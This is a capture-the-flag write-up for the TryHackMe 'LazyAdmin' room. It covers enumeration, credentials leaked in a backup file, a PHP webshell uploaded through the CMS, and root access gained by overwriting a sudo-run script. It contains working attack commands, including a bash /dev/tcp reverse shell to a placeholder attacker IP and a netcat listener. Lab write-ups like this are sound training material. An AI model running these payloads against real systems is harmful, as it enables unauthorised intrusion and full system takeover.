# LazyAdmin — TryHackMe Writeup

**Platform:** [TryHackMe — LazyAdmin](https://tryhackme.com/room/lazyadmin)
**Difficulty:** Easy

---

## 1. Recon

```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Findings:**
- Port 80 open → HTTP Webserver

---

## 2. Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Found: `/content/`

```bash
gobuster dir -u http://<TARGET_IP>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Found: `/content/inc/mysql_backup/`

---

## 3. Initial Access

The backup file contained credentials:

```
User:     manager
Password: Password123
```

Admin panel at:

```
http://<TARGET_IP>/content/as/
```

Login successful.

---

## 4. Code Execution

Upload functionality available in Media Center. Tested PHP execution:

```php
<?php system("id"); ?>
```

Output: `www-data` → RCE confirmed.

---

## 5. Reverse Shell

**Terminal 1 — Listener:**

```bash
nc -lvnp 4444
```

**Terminal 2 — Prepare shell:**

Save a PHP reverse shell as `.phtml` (set your `<ATTACKER_IP>` and port `4444`).

**Upload:** Media Center → Browse → `shell.phtml` → Done

**Trigger the shell:**

```bash
curl http://<TARGET_IP>/content/attachment/shell.phtml
```

→ Access as `www-data`.

---

## 6. User Flag

```bash
find / -name user.txt 2>/dev/null
```

Flag at: `/home/itguy/user.txt`

---

## 7. Privilege Escalation — Enumeration

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

---

## 8. Analyze the Exploit Path

```bash
cat /home/itguy/backup.pl
```

Content:

```perl
system("sh", "/etc/copy.sh");
```

```bash
ls -l /etc/copy.sh
```

`/etc/copy.sh` is writable by `www-data`.

---

## 9. Privilege Escalation

Overwrite the script:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' > /etc/copy.sh
```

Start listener:

```bash
nc -lvnp 4444
```

Execute as root:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

→ Root shell obtained.

---

## 10. Root Flag

```bash
cat /root/root.txt
```

---

## Lessons Learned

- Backup files can leak credentials → always check `/backup/`, `/inc/`, `/db/`
- Weak upload restrictions allow RCE via PHP webshells
- Writable scripts executed via `sudo` are direct escalation paths
- Always check `sudo -l` early
